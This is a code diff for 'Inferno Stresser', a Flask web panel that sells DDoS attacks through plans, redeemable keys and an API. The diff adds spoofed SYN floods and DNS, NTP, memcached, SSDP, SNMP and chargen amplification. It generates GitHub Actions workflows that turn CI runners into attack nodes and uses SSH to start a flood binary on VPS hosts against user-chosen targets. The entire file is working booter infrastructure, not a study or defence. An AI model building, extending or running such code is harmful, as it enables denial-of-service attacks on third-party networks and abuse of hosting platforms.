@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
-Inferno Stresser - Complete Web Panel
-Features: User/Admin auth, Attack Hub, Plans, Key Redemption, Admin Dashboard,
-Node Management (GitHub/VPS), Key Management, Settings, Test Attack Lab,
-Manage Admins (granular permissions), API Key Management, API Attack Endpoint.
+Inferno Stresser - Complete Web Panel with Ultimate Binary Support
+Methods: udp, syn, tcp, http, icmp, dns, ntp, memcached, ssdp, snmp, chargen, mixed
+Modes: default, max-pps, max-bandwidth, both
 """
 import os
 import socket
@@ -36,8 +35,24 @@ os.makedirs(os.path.join(app.root_path, 'backups'), exist_ok=True)
 MAINTENANCE_MODE = False
 GLOBAL_COOLDOWN = 30
 MAX_ATTACK_DURATION = 300
-DEFAULT_THREADS = 1500
+DEFAULT_THREADS = 2500
 MAX_THREADS_LIMIT = 10000
+
+# ==================== ATTACK METHODS ====================
+ATTACK_METHODS = [
+    ('udp', '🔥 UDP Flood (Amplification)'),
+    ('syn', '⚡ SYN Spoof (Root Required)'),
+    ('tcp', '🌐 TCP Connect Flood'),
+    ('http', '💻 HTTP GET/POST Flood'),
+    ('icmp', '📡 ICMP Echo Flood (Root Required)'),
+    ('dns', '🔍 DNS Amplification'),
+    ('ntp', '⏰ NTP Amplification'),
+    ('memcached', '💾 Memcached Amplification'),
+    ('ssdp', '📺 SSDP Reflection'),
+    ('snmp', '📊 SNMP Reflection'),
+    ('chargen', '📝 CHARGEN Reflection'),
+    ('mixed', '🌀 Mixed (UDP+TCP+HTTP)'),
+]
 
 # ==================== PLAN DEFINITIONS ====================
 PLANS = [
@@ -71,7 +86,6 @@ if MONGO_URL:
         USE_MONGO = True
         print("✅ MongoDB connected")
 
-        # Assign collections
         users_col = db['users']
         api_keys_col = db['api_keys']
         attack_logs_col = db['attack_logs']
@@ -79,18 +93,15 @@ if MONGO_URL:
         admin_users_col = db['admin_users']
         generated_keys_col = db['generated_keys']
 
-        # Ensure collections exist
         for coll in ['users', 'api_keys', 'attack_logs', 'attack_nodes', 'admin_users', 'generated_keys']:
             if coll not in db.list_collection_names():
                 db.create_collection(coll)
 
-        # Upgrade existing admin docs
         admin_users_col.update_many(
             {"is_super": {"$exists": False}},
             {"$set": {"is_super": True, "permissions": []}}
         )
 
-        # Create default super admin if none
         if admin_users_col.count_documents({}) == 0:
             admin_users_col.insert_one({
                 "username": "admin",
@@ -108,7 +119,6 @@ else:
     print("⚠️ MONGO_URL not set – using SQLite")
 
 if USE_MONGO:
-    # Already assigned
     pass
 else:
     app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///stresser.db'
@@ -152,6 +162,7 @@ else:
         port = db_sql.Column(db_sql.Integer)
         duration = db_sql.Column(db_sql.Integer)
         method = db_sql.Column(db_sql.String(20), default="udp")
+        mode = db_sql.Column(db_sql.String(20), default="default")
         threads = db_sql.Column(db_sql.Integer, default=1500)
         concurrent = db_sql.Column(db_sql.Integer, default=1)
         github_nodes_used = db_sql.Column(db_sql.Integer, default=0)
@@ -274,14 +285,41 @@ def process_attack_queue():
             print(f"Attack error: {e}")
         time.sleep(1)
 
+def build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit):
+    flags = []
+    if mode == 'max-pps':
+        flags.append('--max-pps')
+    elif mode == 'max-bandwidth':
+        flags.append('--max-bandwidth')
+    elif mode == 'both':
+        flags.append('--max-pps')
+        flags.append('--max-bandwidth')
+    if random_ports:
+        flags.append('--random-ports')
+    if random_delay:
+        flags.append('--random-delay')
+    if spoof:
+        flags.append('--spoof')
+    if flood:
+        flags.append('--flood')
+    if pps_limit > 0:
+        flags.append(f'--pps-limit {pps_limit}')
+    return ' '.join(flags)
+
 def run_attack(params):
     user_id = params['user_id']
     target = params['target']
     port = params['port']
     duration = params['duration']
     method = params.get('method', 'udp')
+    mode = params.get('mode', 'default')
     threads = params.get('threads', DEFAULT_THREADS)
     concurrent = params.get('concurrent', 1)
+    random_ports = params.get('random_ports', 0)
+    random_delay = params.get('random_delay', 0)
+    spoof = params.get('spoof', 0)
+    flood = params.get('flood', 0)
+    pps_limit = params.get('pps_limit', 0)
 
     if USE_MONGO:
         github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
@@ -294,23 +332,25 @@ def run_attack(params):
     vps_success = 0
 
     for node in github_nodes:
-        if trigger_github_attack(node, target, port, duration, method, threads):
+        if trigger_github_attack(node, target, port, duration, method, threads, mode,
+                                 random_ports, random_delay, spoof, flood, pps_limit):
             github_success += 1
 
     for node in vps_nodes:
-        if trigger_vps_attack(node, target, port, duration, method, threads):
+        if trigger_vps_attack(node, target, port, duration, method, threads, mode,
+                              random_ports, random_delay, spoof, flood, pps_limit):
             vps_success += 1
 
     if USE_MONGO:
         attack_logs_col.insert_one({
             "user_id": user_id, "target": target, "port": port, "duration": duration,
-            "method": method, "threads": threads, "concurrent": concurrent,
+            "method": method, "mode": mode, "threads": threads, "concurrent": concurrent,
             "github_nodes_used": github_success, "vps_nodes_used": vps_success,
             "status": "completed", "timestamp": datetime.utcnow()
         })
         users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -concurrent}})
     else:
-        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method,
+        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method, mode=mode,
                         threads=threads, concurrent=concurrent, github_nodes_used=github_success,
                         vps_nodes_used=vps_success, status='completed')
         db_sql.session.add(log)
@@ -320,11 +360,15 @@ def run_attack(params):
             user.slots_used = max(0, user.slots_used - concurrent)
         db_sql.session.commit()
 
-def trigger_github_attack(node, target, port, duration, method='udp', threads=1500):
+def trigger_github_attack(node, target, port, duration, method, threads, mode,
+                          random_ports, random_delay, spoof, flood, pps_limit):
     token = node['github_token'] if USE_MONGO else node.github_token
     repo_name = node['github_repo'] if USE_MONGO else node.github_repo
     matrix_size = 10
     matrix_list = ','.join(str(i) for i in range(1, matrix_size + 1))
+
+    flags_str = build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit)
+
     yml_content = f"""name: Inferno Attack
 on: [push]
 
@@ -336,8 +380,8 @@ jobs:
         n: [{matrix_list}]
     steps:
       - uses: actions/checkout@v3
-      - run: chmod +x primex
-      - run: ./primex {method} {target} {port} 10 {threads}
+      - run: chmod +x ultimate
+      - run: ./ultimate {method} {target} {port} 10 {threads} {flags_str}
 
   stage-1-main:
     needs: stage-0-init
@@ -347,8 +391,8 @@ jobs:
         n: [{matrix_list}]
     steps:
       - uses: actions/checkout@v3
-      - run: chmod +x primex
-      - run: ./primex {method} {target} {port} {duration} {threads}
+      - run: chmod +x ultimate
+      - run: ./ultimate {method} {target} {port} {duration} {threads} {flags_str}
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -371,8 +415,8 @@ jobs:
         iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
     steps:
       - uses: actions/checkout@v3
-      - run: chmod +x primex
-      - run: ./primex {method} {target} {port} 10 {threads}
+      - run: chmod +x ultimate
+      - run: ./ultimate {method} {target} {port} 10 {threads} {flags_str}
 
   stage-3-cleanup:
     needs: [stage-1-main, stage-2-sequential]
@@ -401,7 +445,8 @@ jobs:
         print(f"GitHub error: {e}")
         return False
 
-def trigger_vps_attack(node, target, port, duration, method, threads):
+def trigger_vps_attack(node, target, port, duration, method, threads, mode,
+                       random_ports, random_delay, spoof, flood, pps_limit):
     host = node['vps_host'] if USE_MONGO else node.vps_host
     ssh_port = node['vps_port'] if USE_MONGO else node.vps_port
     username = node['vps_username'] if USE_MONGO else node.vps_username
@@ -421,14 +466,16 @@ def trigger_vps_attack(node, target, port, duration, method, threads):
         stdin, stdout, stderr = ssh.exec_command("whoami")
         user = stdout.read().decode().strip()
         if user == "root":
-            binary_path = "/root/primex"
+            binary_path = "/root/ultimate"
             work_dir = "/root"
         else:
-            binary_path = f"/home/{user}/primex"
+            binary_path = f"/home/{user}/ultimate"
             work_dir = f"/home/{user}"
 
-        ssh.exec_command("pkill -f primex; sleep 1")
-        cmd = f"cd {work_dir} && nohup {binary_path} {method} {target} {port} {duration} {threads} > /dev/null 2>&1 &"
+        flags_str = build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit)
+
+        ssh.exec_command("pkill -f ultimate; sleep 1")
+        cmd = f"cd {work_dir} && nohup {binary_path} {method} {target} {port} {duration} {threads} {flags_str} > /dev/null 2>&1 &"
         ssh.exec_command(cmd)
         ssh.close()
 
@@ -452,7 +499,7 @@ def test_github_node_detailed(node):
         g = Github(token)
         repo = g.get_repo(repo_name)
         try:
-            repo.get_contents("primex")
+            repo.get_contents("ultimate")
             result['binary_present'] = True
         except:
             pass
@@ -501,9 +548,9 @@ def test_vps_node_detailed(node):
         stdin, stdout, stderr = ssh.exec_command("whoami")
         user = stdout.read().decode().strip()
         if user == "root":
-            check_cmd = "test -f /root/primex && echo 'exists'"
+            check_cmd = "test -f /root/ultimate && echo 'exists'"
         else:
-            check_cmd = f"test -f /home/{user}/primex && echo 'exists'"
+            check_cmd = f"test -f /home/{user}/ultimate && echo 'exists'"
         stdin, stdout, stderr = ssh.exec_command(check_cmd)
         output = stdout.read().decode().strip()
         ssh.close()
@@ -610,8 +657,14 @@ def attack_page():
         port = int(request.form.get('port'))
         duration = int(request.form.get('duration'))
         method = request.form.get('method', 'udp')
+        mode = request.form.get('mode', 'default')
         threads = int(request.form.get('threads', DEFAULT_THREADS))
         concurrent = int(request.form.get('concurrent', 1))
+        random_ports = 1 if request.form.get('random_ports') else 0
+        random_delay = 1 if request.form.get('random_delay') else 0
+        spoof = 1 if request.form.get('spoof') else 0
+        flood = 1 if request.form.get('flood') else 0
+        pps_limit = int(request.form.get('pps_limit', 0))
 
         max_dur = user.get('max_duration', 60) if USE_MONGO else user.max_duration
         max_threads = user.get('max_threads', 1500) if USE_MONGO else user.max_threads
@@ -646,7 +699,10 @@ def attack_page():
             attack_queue.append({
                 'user_id': ObjectId(session['user_id']) if USE_MONGO else session['user_id'],
                 'target': target, 'port': port, 'duration': duration,
-                'method': method, 'threads': threads, 'concurrent': concurrent
+                'method': method, 'mode': mode, 'threads': threads, 'concurrent': concurrent,
+                'random_ports': random_ports, 'random_delay': random_delay,
+                'spoof': spoof, 'flood': flood, 'pps_limit': pps_limit,
+                'source': 'web'
             })
             if not is_attacking:
                 is_attacking = True
@@ -665,7 +721,7 @@ def attack_page():
         flash('Attack queued', 'success')
         return redirect(url_for('attack_page'))
 
-    return render_template_string(ATTACK_HTML, user=user)
+    return render_template_string(ATTACK_HTML, user=user, methods=ATTACK_METHODS)
 
 @app.route('/products')
 def products_page():
@@ -986,10 +1042,10 @@ def admin_upload_binary():
                 g = Github(token)
                 repo = g.get_repo(repo_name)
                 try:
-                    contents = repo.get_contents("primex", ref="main")
-                    repo.update_file("primex", "Update binary", binary_data, contents.sha, branch="main")
+                    contents = repo.get_contents("ultimate", ref="main")
+                    repo.update_file("ultimate", "Update binary", binary_data, contents.sha, branch="main")
                 except:
-                    repo.create_file("primex", "Add binary", binary_data, branch="main")
+                    repo.create_file("ultimate", "Add binary", binary_data, branch="main")
                 if USE_MONGO:
                     attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
                 else:
@@ -1013,9 +1069,9 @@ def admin_upload_binary():
                 stdin, stdout, stderr = ssh.exec_command("whoami")
                 user = stdout.read().decode().strip()
                 if user == "root":
-                    remote_path = "/root/primex"
+                    remote_path = "/root/ultimate"
                 else:
-                    remote_path = f"/home/{user}/primex"
+                    remote_path = f"/home/{user}/ultimate"
                     ssh.exec_command(f"mkdir -p /home/{user}")
                 sftp = ssh.open_sftp()
                 sftp.putfo(io.BytesIO(binary_data), remote_path)
@@ -1199,7 +1255,13 @@ def admin_test_attack():
         port = int(request.form.get('port'))
         duration = int(request.form.get('duration'))
         method = request.form.get('method', 'udp')
+        mode = request.form.get('mode', 'default')
         threads = int(request.form.get('threads', DEFAULT_THREADS))
+        random_ports = 1 if request.form.get('random_ports') else 0
+        random_delay = 1 if request.form.get('random_delay') else 0
+        spoof = 1 if request.form.get('spoof') else 0
+        flood = 1 if request.form.get('flood') else 0
+        pps_limit = int(request.form.get('pps_limit', 0))
 
         if duration > 30:
             flash('Test duration limited to 30 seconds', 'warning')
@@ -1219,7 +1281,8 @@ def admin_test_attack():
         for node in github_nodes:
             node_name = node['name'] if USE_MONGO else node.name
             try:
-                if trigger_github_attack(node, target, port, duration, method, threads):
+                if trigger_github_attack(node, target, port, duration, method, threads, mode,
+                                         random_ports, random_delay, spoof, flood, pps_limit):
                     results.append({'name': node_name, 'type': 'GitHub', 'status': '✅ Success', 'details': ''})
                     github_success += 1
                 else:
@@ -1230,7 +1293,8 @@ def admin_test_attack():
         for node in vps_nodes:
             node_name = node['name'] if USE_MONGO else node.name
             try:
-                if trigger_vps_attack(node, target, port, duration, method, threads):
+                if trigger_vps_attack(node, target, port, duration, method, threads, mode,
+                                      random_ports, random_delay, spoof, flood, pps_limit):
                     results.append({'name': node_name, 'type': 'VPS', 'status': '✅ Success', 'details': ''})
                     vps_success += 1
                 else:
@@ -1241,11 +1305,12 @@ def admin_test_attack():
         flash(f'Test completed: GitHub {github_success}/{len(github_nodes)} | VPS {vps_success}/{len(vps_nodes)}', 'info')
         return render_template_string(ADMIN_TEST_ATTACK_HTML,
                                       results=results, target=target, port=port, duration=duration,
-                                      method=method, threads=threads,
+                                      method=method, mode=mode, threads=threads,
                                       github_total=len(github_nodes), vps_total=len(vps_nodes),
-                                      github_success=github_success, vps_success=vps_success)
+                                      github_success=github_success, vps_success=vps_success,
+                                      methods=ATTACK_METHODS)
 
-    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None)
+    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None, methods=ATTACK_METHODS)
 
 @app.route('/admin/test-attack/single', methods=['POST'])
 @admin_required('test_attack')
@@ -1255,7 +1320,13 @@ def admin_test_single_node():
     port = int(request.form.get('port', 443))
     duration = min(int(request.form.get('duration', 5)), 10)
     method = request.form.get('method', 'udp')
+    mode = request.form.get('mode', 'default')
     threads = int(request.form.get('threads', 500))
+    random_ports = 1 if request.form.get('random_ports') else 0
+    random_delay = 1 if request.form.get('random_delay') else 0
+    spoof = 1 if request.form.get('spoof') else 0
+    flood = 1 if request.form.get('flood') else 0
+    pps_limit = int(request.form.get('pps_limit', 0))
 
     if USE_MONGO:
         node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
@@ -1270,9 +1341,11 @@ def admin_test_single_node():
 
     try:
         if node_type == 'github':
-            success = trigger_github_attack(node, target, port, duration, method, threads)
+            success = trigger_github_attack(node, target, port, duration, method, threads, mode,
+                                            random_ports, random_delay, spoof, flood, pps_limit)
         else:
-            success = trigger_vps_attack(node, target, port, duration, method, threads)
+            success = trigger_vps_attack(node, target, port, duration, method, threads, mode,
+                                         random_ports, random_delay, spoof, flood, pps_limit)
 
         if success:
             return jsonify({'status': 'success', 'message': f'Attack launched on {node_name}'})
@@ -1492,8 +1565,14 @@ def api_attack():
     port = data.get('port')
     duration = data.get('duration')
     method = data.get('method', 'udp')
+    mode = data.get('mode', 'default')
     threads = data.get('threads', DEFAULT_THREADS)
     concurrent = data.get('concurrent', 1)
+    random_ports = data.get('random_ports', 0)
+    random_delay = data.get('random_delay', 0)
+    spoof = data.get('spoof', 0)
+    flood = data.get('flood', 0)
+    pps_limit = data.get('pps_limit', 0)
 
     if not all([api_key, target, port, duration]):
         return jsonify({'error': 'Missing parameters'}), 400
@@ -1555,8 +1634,14 @@ def api_attack():
             'port': port,
             'duration': duration,
             'method': method,
+            'mode': mode,
             'threads': threads,
             'concurrent': concurrent,
+            'random_ports': random_ports,
+            'random_delay': random_delay,
+            'spoof': spoof,
+            'flood': flood,
+            'pps_limit': pps_limit,
             'source': 'api'
         })
         global is_attacking
@@ -1644,9 +1729,6 @@ def admin_stop_attack():
         current_attack = None
     flash('Attack queue cleared', 'success')
     return redirect(url_for('admin_dashboard'))
-
-# ==================== HTML TEMPLATES ====================
-# ==================== ALL HTML TEMPLATES ====================
 
 LOGIN_HTML = '''
 <!DOCTYPE html>
@@ -1753,7 +1835,7 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
         <p>Have a premium key? Redeem it here to upgrade your plan instantly.</p>
         <form method="POST" action="/redeem">
             <div class="input-group">
-                <input type="text" name="key" class="form-control bg-dark text-white" placeholder="Enter your key (e.g., KEY-XXXXXXXX)" required>
+                <input type="text" name="key" class="form-control bg-dark text-white" placeholder="Enter your key" required>
                 <button type="submit" class="btn-neon" style="width:auto; padding:12px 30px; border-radius:60px;">Redeem</button>
             </div>
         </form>
@@ -1763,12 +1845,12 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
         <h3><i class="fas fa-history me-2"></i> Recent Attacks</h3>
         <div class="table-responsive">
             <table class="table table-dark table-hover">
-                <thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Threads</th><th>Status</th><th>Time</th></tr></thead>
+                <thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Mode</th><th>Threads</th><th>Status</th><th>Time</th></tr></thead>
                 <tbody>
                 {% for a in attacks %}
-                <tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td>{{ a.threads }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>
+                <tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td>{{ a.mode }}</td><td>{{ a.threads }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>
                 {% else %}
-                <tr><td colspan="7" class="text-center">No attacks yet</td></tr>
+                <tr><td colspan="8" class="text-center">No attacks yet</td></tr>
                 {% endfor %}
                 </tbody>
             </table>
@@ -1797,28 +1879,44 @@ input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius
 <div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2"></i> Launch Attack</h2>
 {% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{cat}}">{{msg}}</div>{% endfor %}{% endwith %}
 <form method="POST">
-    <div class="mb-3"><label>Target IP Address</label><input type="text" name="target" placeholder="e.g., 1.1.1.1" required></div>
-    <div class="mb-3"><label>Port</label><input type="number" name="port" placeholder="443" required></div>
-    <div class="mb-3"><label>Duration (seconds) – Max {{ user.max_duration }}s</label><input type="number" name="duration" value="60" min="1" max="{{ user.max_duration }}" required></div>
-    <div class="mb-3"><label>Attack Method</label>
-        <select name="method" class="form-select bg-dark text-white">
-            <option value="udp">🔥 UDP Flood (Gaming/BGMI)</option>
-            <option value="tcp">🌐 TCP Flood (Web Servers)</option>
-            <option value="http">💻 HTTP Flood (Websites)</option>
-            <option value="icmp">📡 ICMP Flood (Network Layer)</option>
-            <option value="mixed">⚡ Mixed Flood (All Purpose)</option>
-        </select>
+    <div class="row">
+        <div class="col-md-6"><label>Target IP</label><input type="text" name="target" placeholder="1.1.1.1" required></div>
+        <div class="col-md-6"><label>Port</label><input type="number" name="port" placeholder="443" required></div>
     </div>
-    <div class="mb-3"><label>Threads (Power) – Max {{ user.max_threads }}</label>
-        <input type="range" name="threads" class="form-range" min="100" max="{{ user.max_threads }}" value="1500" oninput="this.nextElementSibling.value=this.value"><output>1500</output>
+    <div class="row mt-3">
+        <div class="col-md-4"><label>Duration (max {{ user.max_duration }}s)</label><input type="number" name="duration" value="60" required></div>
+        <div class="col-md-4"><label>Threads (max {{ user.max_threads }})</label><input type="number" name="threads" value="1500" required></div>
+        <div class="col-md-4"><label>Concurrent (max {{ user.max_concurrent }})</label><input type="number" name="concurrent" value="1" required></div>
     </div>
-    <div class="mb-3"><label>Concurrent (Max {{ user.max_concurrent }})</label>
-        <input type="range" name="concurrent" class="form-range" min="1" max="{{ user.max_concurrent }}" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output>
+    <div class="row mt-3">
+        <div class="col-md-6">
+            <label>Attack Method</label>
+            <select name="method" class="form-select bg-dark text-white">
+                {% for val, label in methods %}
+                <option value="{{ val }}">{{ label }}</option>
+                {% endfor %}
+            </select>
+        </div>
+        <div class="col-md-6">
+            <label>Attack Mode</label>
+            <select name="mode" class="form-select bg-dark text-white">
+                <option value="default">Default (Mixed Payloads)</option>
+                <option value="max-pps">⚡ Max PPS (Tiny Packets)</option>
+                <option value="max-bandwidth">🌊 Max Bandwidth (Reflection/Large)</option>
+                <option value="both">🔥 Both (Blended 70% BW / 30% PPS)</option>
+            </select>
+        </div>
     </div>
-    <button type="submit" class="btn-neon">💥 Launch Attack</button>
+    <div class="mt-3">
+        <label class="form-check-label me-3"><input type="checkbox" name="random_ports" value="1"> Random Ports</label>
+        <label class="form-check-label me-3"><input type="checkbox" name="random_delay" value="1"> Random Delay</label>
+        <label class="form-check-label me-3"><input type="checkbox" name="spoof" value="1"> Spoof (UDP/SYN)</label>
+        <label class="form-check-label"><input type="checkbox" name="flood" value="1"> Flood Mode (No Output)</label>
+    </div>
+    <div class="mt-3"><label>PPS Limit (0 = unlimited)</label><input type="number" name="pps_limit" class="form-control bg-dark text-white" value="0" min="0"></div>
+    <button type="submit" class="btn-neon mt-4">💥 Launch Attack</button>
 </form></div>
 <a href="/dashboard" class="btn btn-link text-info">← Back to Dashboard</a></div>
-<script>document.querySelectorAll('input[type="range"]').forEach(r=>r.addEventListener('input',function(){this.nextElementSibling.value=this.value;}));</script>
 </body></html>
 '''
 
@@ -1968,18 +2066,37 @@ ADMIN_NODES_HTML = '''
 <div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div>
 <button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div>
 </div>
-<div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary (primex)</div><div class="card-body">
+<div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary (ultimate)</div><div class="card-body">
 <form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2">
 <div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div>
-<div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload compiled 'primex' binary.</small></div></div>
+<div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload compiled 'ultimate' binary.</small></div></div>
 <div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead>
-<tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td>
-<td class="{% if n.status_detail=='active' %}status-online{% else %}status-offline{% endif %}">{{ n.status_detail|default('unknown') }}</td>
-<td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td>
-<td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td>
-<td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form>
-<form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form>
-<form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
+<tbody>
+{% for n in nodes %}
+<tr>
+  <td>{{ n.name }}</td>
+  <td>{{ n.node_type }}</td>
+  <td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td>
+  <td class="{% if n.status_detail=='active' %}status-online{% else %}status-offline{% endif %}">{{ n.status_detail|default('unknown') }}</td>
+  <td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td>
+  <td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td>
+  <td>
+    <!-- Check button -->
+    <form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline-block; margin-right:4px;">
+      <button type="submit" class="btn btn-sm btn-info">Check</button>
+    </form>
+    <!-- Toggle button -->
+    <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline-block; margin-right:4px;">
+      <button type="submit" class="btn btn-sm btn-warning">Toggle</button>
+    </form>
+    <!-- Delete button -->
+    <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline-block;" onsubmit="return confirm('Delete this node?');">
+      <button type="submit" class="btn btn-sm btn-danger">Delete</button>
+    </form>
+  </td>
+</tr>
+{% endfor %}
+</tbody></table></div></div></div></body></html>
 '''
 
 ADMIN_KEYS_HTML = '''
@@ -2006,72 +2123,6 @@ ADMIN_KEYS_HTML = '''
 <td><form method="POST" action="/admin/keys/{{ k.id }}/delete" onsubmit="return confirm('Delete?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></body></html>
 '''
 
-ADMIN_SETTINGS_HTML = '''
-<!DOCTYPE html>
-<html><head><title>Admin Settings • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>body{background:#0a0a1a;color:#fff;padding:20px;}.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
-.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:40px;padding:8px 20px;font-weight:bold;color:#000;}
-.btn-danger{background:#ff3355;border:none;color:#fff;}.btn-warning{background:#ffaa00;color:#000;}</style>
-</head>
-<body><div class="container">
-<div class="glass-card"><h2><i class="fas fa-cog me-2"></i>Admin Settings</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<ul class="nav nav-tabs mb-3" id="settingsTabs" role="tablist">
-  <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#config">⚙️ Configuration</a></li>
-  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#storage">💾 Storage</a></li>
-  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#security">🔐 Security</a></li>
-  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#broadcast">📢 Broadcast</a></li>
-</ul>
-<div class="tab-content">
-  <div class="tab-pane fade show active" id="config">
-    <form method="POST" action="/admin/settings/update">
-      <input type="hidden" name="action" value="update_config">
-      <div class="row">
-        <div class="col-md-6"><label>Global Cooldown (seconds)</label><input type="number" name="cooldown" class="form-control bg-dark text-white" value="{{ cooldown }}" min="0"><small>Time users must wait between attacks.</small></div>
-        <div class="col-md-6"><label>Max Attack Duration (seconds)</label><input type="number" name="max_duration" class="form-control bg-dark text-white" value="{{ max_duration }}" min="1"><small>Absolute maximum attack time.</small></div>
-      </div>
-      <div class="row mt-3">
-        <div class="col-md-6"><label>Default Threads (new users)</label><input type="number" name="default_threads" class="form-control bg-dark text-white" value="{{ default_threads }}" min="100"></div>
-        <div class="col-md-6"><label>Max Threads Limit</label><input type="number" name="max_threads" class="form-control bg-dark text-white" value="{{ max_threads }}" min="100"><small>Hard limit for all users.</small></div>
-      </div>
-      <button type="submit" class="btn-neon mt-3">Save Configuration</button>
-    </form>
-    <hr class="my-4"><h5>Maintenance Mode</h5><p>Status: <span class="badge bg-{{ 'danger' if maintenance else 'success' }}">{{ 'ON' if maintenance else 'OFF' }}</span></p>
-    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="toggle_maintenance"><button type="submit" class="btn btn-warning">Toggle Maintenance Mode</button></form>
-  </div>
-  <div class="tab-pane fade" id="storage">
-    <h5>Database Statistics</h5>
-    <table class="table table-dark"><tr><th>Collection</th><th>Documents</th><th>Actions</th></tr>
-      <tr><td>Users</td><td>{{ stats.users }}</td><td><form method="POST" action="/admin/settings/clear/users" onsubmit="return confirm('Clear all non-admin users?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
-      <tr><td>API Keys</td><td>{{ stats.api_keys }}</td><td><form method="POST" action="/admin/settings/clear/api_keys" onsubmit="return confirm('Clear all API keys?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
-      <tr><td>Attack Logs</td><td>{{ stats.attack_logs }}</td><td><form method="POST" action="/admin/settings/clear/attack_logs" onsubmit="return confirm('Clear all attack logs?')"><button class="btn btn-sm btn-warning">Clear</button></form></td></tr>
-      <tr><td>Attack Nodes</td><td>{{ stats.attack_nodes }}</td><td><form method="POST" action="/admin/settings/clear/attack_nodes" onsubmit="return confirm('Clear all nodes?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
-      <tr><td>Generated Keys</td><td>{{ stats.generated_keys }}</td><td><form method="POST" action="/admin/settings/clear/generated_keys" onsubmit="return confirm('Clear all keys?')"><button class="btn btn-sm btn75">Clear</button></form></td></tr>
-    </table>
-    <p>Total Database Size: {{ (stats.db_size / 1024 / 1024)|round(2) }} MB</p>
-  </div>
-  <div class="tab-pane fade" id="security">
-    <h5>Change Admin Password</h5>
